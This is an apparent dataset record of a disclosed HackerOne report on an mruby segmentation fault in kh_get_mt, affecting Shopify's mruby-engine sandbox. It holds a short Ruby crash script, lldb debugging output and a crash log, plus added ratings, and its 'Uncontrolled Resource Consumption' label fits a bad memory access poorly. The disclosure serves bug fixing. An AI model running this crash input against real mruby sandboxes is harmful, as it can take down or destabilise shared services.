{
  "reported_to": "shopify-scripts",
  "reported_by": "haquaman ",
  "title": "Segmentation fault due to bad memory access in kh_get_mt",
  "content": "\nCrash file is:\nCode 173 Bytes\n1values=[0,0,0,0]\n2unused_but_needed=[]\n3Hash=[]\n4values.each do\n5  values.each do\n6    values & values.each do\n7      values.each do\n8        %  [0]=nil\n9      end\n10    end\n11  end\n12end\nCode 51 Bytes\n1 $ ./dev/bin/mruby crash.rb\n2Segmentation fault: 11\n3\nCode 2.13 KiB\n1$ lldb ./dev/bin/mruby crash.rb\n2(lldb) target create \"./dev/bin/mruby\"\n3Current executable set to './dev/bin/mruby' (x86_64).\n4(lldb) settings set -- target.run-args  \"crash.rb\"\n5(lldb) r\n6Process 27834 launched: './dev/bin/mruby' (x86_64)\n7Process 27834 stopped\n8* thread #1: tid = 0x879ccd0, 0x0000000100006cb6 mruby`kh_get_mt + 38, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x80)\n9    frame #0: 0x0000000100006cb6 mruby`kh_get_mt + 38\n10mruby`kh_get_mt:\n11->  0x100006cb6 <+38>: movl   (%rsi), %eax\n12    0x100006cb8 <+40>: subl   $0x1, %eax\n13    0x100006cbb <+43>: andl   %eax, %edx\n14    0x100006cbd <+45>: movl   %edx, -0x20(%rbp)\n15(lldb) bt\n16* thread #1: tid = 0x879ccd0, 0x0000000100006cb6 mruby`kh_get_mt + 38, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x80)\n17  * frame #0: 0x0000000100006cb6 mruby`kh_get_mt + 38\n18    frame #1: 0x000000010000ba80 mruby`mrb_method_search_vm + 80\n19    frame #2: 0x000000010003f8b9 mruby`mrb_vm_exec + 5881\n20    frame #3: 0x000000010003e1a7 mruby`mrb_vm_run + 135\n21    frame #4: 0x0000000100046604 mruby`mrb_top_run + 100\n22    frame #5: 0x0000000100071adf mruby`load_exec + 1183\n23    frame #6: 0x0000000100071623 mruby`mrb_load_file_cxt + 67\n24    frame #7: 0x00000001000017d8 mruby`main + 904\n25    frame #8: 0x00007fff8a9db5ad libdyld.dylib`start + 1\n26(lldb) register read\n27General Purpose Registers:\n28       rax = 0x0000000000000025\n29       rbx = 0x0000000000000000\n30       rcx = 0x00000001002028a0\n31       rdx = 0x00000000000002eb\n32       rdi = 0x00000001002029f0\n33       rsi = 0x0000000000000080\n34       rbp = 0x00007fff5fbfc9f0\n35       rsp = 0x00007fff5fbfc9f0\n36        r8 = 0x00000001002029ff\n37        r9 = 0x00007fff5fbfc9b0\n38       r10 = 0xf100d311ef8d6921\n39       r11 = 0x0000000000000001\n40       r12 = 0x0000000000000000\n41       r13 = 0x0000000000000000\n42       r14 = 0x0000000000000000\n43       r15 = 0x0000000000000000\n44       rip = 0x0000000100006cb6  mruby`kh_get_mt + 38\n45    rflags = 0x0000000000010206\n46        cs = 0x000000000000002b\n47        fs = 0x0000000000000000\n48        gs = 0x0000000000000000\n49\n50(lldb) q\n51Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y\n52\nAnother lldb run with symbols to see what class is in the mrb_method_search_vm\nCode 2.23 KiB\n1$ lldb ./mruby/bin/mruby crash.rb\n2(lldb) target create \"./mruby/bin/mruby\"\n3Current executable set to './mruby/bin/mruby' (x86_64).\n4(lldb) settings set -- target.run-args  \"crash.rb\"\n5(lldb) r\n6Process 95246 launched: './mruby/bin/mruby' (x86_64)\n7nt = 3\n8nt = 17\n9nt = 24\n10nt = 35\n11nt = 51\n12nt = 51\n13nt = 51\n14nt = 51\n15nt = 24\n16nt = 35\n17nt = 24\n18nt = 35\n19nt = 29\n20nt = 40\n21nt = 4\n22nt = 17\n23nt = 29\n24nt = 40\n25nt = 4\n26nt = 17\n27nt = 29\n28nt = 40\n29nt = 29\n30nt = 40\n31nt = 4\n32nt = 17\n33nt = 29\n34nt = 40\n35nt = 4\n36nt = 17\n37nt = 24\n38nt = 87\n39nt = 56\n40nt = 51\n41in gen_send\n42in gen_send\n43in gen_send\n44in gen_send\n45in gen_send\n46in gen_send\n47Process 95246 stopped\n48* thread #1: tid = 0x87adab7, 0x0000000100006436 mruby`kh_get_mt(mrb=0x0000000100202c80, h=0x0000000000000080, key=150) + 38 at class.c:19, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x80)\n49    frame #0: 0x0000000100006436 mruby`kh_get_mt(mrb=0x0000000100202c80, h=0x0000000000000080, key=150) + 38 at class.c:19\n50   16   #include <mruby/data.h>\n51   17   #include <mruby/istruct.h>\n52   18\n53-> 19   KHASH_DEFINE(mt, mrb_sym, struct RProc*, TRUE, kh_int_hash_func, kh_int_hash_equal)\n54   20\n55   21   void\n56   22   mrb_gc_mark_mt(mrb_state *mrb, struct RClass *c)\n57(lldb) up\n58frame #1: 0x000000010000b200 mruby`mrb_method_search_vm(mrb=0x0000000100202c80, cp=0x00007fff5fbfd478, mid=150) + 80 at class.c:1225\n59   1222     khash_t(mt) *h = c->mt;\n60   1223\n61   1224     if (h) {\n62-> 1225       k = kh_get(mt, mrb, h, mid);\n63   1226       if (k != kh_end(h)) {\n64   1227         m = kh_value(h, k);\n65   1228         if (!m) break;\n66(lldb) up\n67frame #2: 0x000000010003f039 mruby`mrb_vm_exec(mrb=0x0000000100202c80, proc=0x0000000100805810, pc=0x0000000100091124) + 5881 at vm.c:1116\n68   1113         }\n69   1114       }\n70   1115       c = mrb_class(mrb, recv);\n71-> 1116       m = mrb_method_search_vm(mrb, &c, mid);\n72   1117       if (!m) {\n73   1118         mrb_value sym = mrb_symbol_value(mid);\n74   1119         mrb_sym missing = mrb_intern_lit(mrb, \"method_missing\");\n75(lldb) p *c\n76(RClass) $0 = {\n77  tt = MRB_TT_STRING\n78  color = 2\n79  flags = 0\n80  c = 0x000000010080ccb0\n81  gcnext = 0x0000000000000000\n82  iv = 0x0000000000000000\n83  mt = 0x0000000000000080\n84  super = 0x0000000100700470\n85}\n86(lldb) q\n87Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y\n88\nAlso affects mruby-engine.\nCode 2.39 KiB\n1./bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000080\n2ruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]\n3\n4-- Crash Report log information --------------------------------------------\n5   See Crash Report log file under the one of following:\n6     * ~/Library/Logs/CrashReporter\n7     * /Library/Logs/CrashReporter\n8     * ~/Library/Logs/DiagnosticReports\n9     * /Library/Logs/DiagnosticReports\n10   for more details.\n11Don't forget to include the above Crash Report log file in bug reports.\n12\n13-- Control frame information -----------------------------------------------\n14c:0003 p:---- s:0011 e:000010 CFUNC  :sandbox_eval\n15c:0002 p:0214 s:0006 E:0001f0 EVAL   ./bin/sandbox:20 [FINISH]\n16c:0001 p:0000 s:0002 E:000570 (none) [FINISH]\n17\n18-- Ruby level backtrace information ----------------------------------------\n19./bin/sandbox:20:in `<main>'\n20./bin/sandbox:20:in `sandbox_eval'\n21\n22-- Machine register context ------------------------------------------------\n23 rax: 0x00000000000002eb rbx: 0x0000000107c48af8 rcx: 0x0000000000000000\n24 rdx: 0x0000000000000096 rdi: 0x0000000107c36440 rsi: 0x00007fff58a19190\n25 rbp: 0x00007fff58a18f50 rsp: 0x00007fff58a18f28  r8: 0x0000000000000001\n26  r9: 0x0000000107bb9104 r10: 0x0000000107bb9100 r11: 0x0000000107c48b00\n27 r12: 0x0000000000000096 r13: 0x0000000000000096 r14: 0x0000000000000080\n28 r15: 0x0000000107c3fc20 rip: 0x0000000107b198e9 rfl: 0x0000000000010202\n29\n30-- C level backtrace information -------------------------------------------\n310   ruby                                0x00000001073835d4 rb_vm_bugreport + 388\n321   ruby                                0x0000000107225023 rb_bug_context + 483\n332   ruby                                0x00000001072f8653 sigsegv + 83\n343   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26\n354   mruby_engine.bundle                 0x0000000107b198e9 mrb_method_search_vm + 89\n365   ???                                 0x0000000107c48af8 0x0 + 4425288440\n37\n38-- Other runtime information -----------------------------------------------\n39\n40* Loaded script: ./bin/sandbox\n41\n42* Loaded features:\n43\n44    0 enumerator.so\n45    1 thread.rb\n46    2 rational.so\n47    3 complex.so\n48<snip various gems>\n49  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle\n50  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb\n51\n52[NOTE]\n53You may have encountered a bug in the Ruby interpreter or extension libraries.\n54Bug reports are welcome.\n55For details: http://www.ruby-lang.org/bugreport.html\n56\nI haven't worked out the ideal place for a patch yet.\nCheers,\nHugh\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 8000,
  "weaknesses": [
    "Uncontrolled Resource Consumption"
  ],
  "screenshots": {},
  "disclosed_date": 1482023220,
  "report_url": "https://hackerone.com/reports/188313",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a Ruby script with nested loops and array operations that triggers a segmentation fault"
    ],
    [
      2,
      "Run the script using mruby or mruby-engine to observe the crash"
    ]
  ],
  "vuln_description": "The vulnerability is a segmentation fault caused by bad memory access in the kh_get_mt function when processing nested loops with array operations in mruby. The crash occurs when trying to access memory at address 0x80, indicating a NULL pointer dereference or invalid memory access during method lookup.",
  "reason": "The vulnerability requires understanding of mruby's internal memory management and method lookup mechanisms. While the crash is reproducible with a relatively simple script, understanding why it occurs requires deep knowledge of mruby's implementation details and hash table handling.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}